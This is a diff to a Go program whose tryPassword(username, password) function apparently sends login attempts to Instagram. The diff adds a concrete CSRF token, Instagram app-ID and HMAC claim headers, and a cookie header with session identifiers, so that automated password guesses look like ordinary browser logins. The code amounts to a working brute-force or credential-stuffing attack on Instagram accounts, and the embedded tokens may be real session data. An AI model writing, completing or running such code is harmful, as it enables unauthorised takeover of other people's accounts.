@@ -27,8 +27,15 @@ func tryPassword(username, password string) bool {
     }
 
     req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
+    req.Header.Set("X-CSRFToken", "z2y86ITZAahahOfRghvrCF3PlUj4wx8N")
+    req.Header.Set("X-Instagram-AJAX", "1023134472")
+    req.Header.Set("X-Requested-With", "XMLHttpRequest")
+    req.Header.Set("Referer", "https://www.instagram.com/accounts/login/")
+    req.Header.Set("Origin", "https://www.instagram.com")
     req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-    req.Header.Set("X-CSRFToken", "dummy") // مقدار واقعی نیاز است
+    req.Header.Set("X-IG-App-ID", "936619743392459")
+    req.Header.Set("X-IG-WWW-Claim", "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC")
+    req.Header.Set("Cookie", `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`)
 
     resp, err := client.Do(req)
     if err != nil {
